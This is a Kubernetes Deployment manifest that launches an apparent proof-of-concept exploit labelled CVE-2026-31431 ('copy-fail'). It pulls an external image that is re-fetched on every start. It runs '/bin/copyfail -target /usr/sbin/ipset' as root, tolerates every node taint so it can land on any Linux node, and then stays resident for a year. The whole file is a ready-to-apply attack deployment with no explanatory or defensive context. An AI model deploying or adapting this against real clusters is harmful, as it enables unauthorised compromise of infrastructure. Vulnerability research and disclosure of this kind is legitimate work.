apiVersion: apps/v1
kind: Deployment
metadata:
  name: copy-fail-poc
  labels:
    app.kubernetes.io/name: copy-fail-poc
    app.kubernetes.io/part-of: cve-2026-31431
spec:
  replicas: 1
  selector:
    matchLabels:
      app.kubernetes.io/name: copy-fail-poc
  template:
    metadata:
      labels:
        app.kubernetes.io/name: copy-fail-poc
        app.kubernetes.io/part-of: cve-2026-31431
    spec:
      nodeSelector:
        kubernetes.io/os: linux
      tolerations:
        - operator: Exists
      containers:
        - name: copy-fail-poc
          image: ghcr.io/percivalll/copy-fail-cve-2026-31431-kubernetes-poc:latest
          imagePullPolicy: Always
          command:
            - /bin/sh
            - -c
            - /bin/copyfail -target /usr/sbin/ipset && sleep 365d
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: false
            runAsNonRoot: false
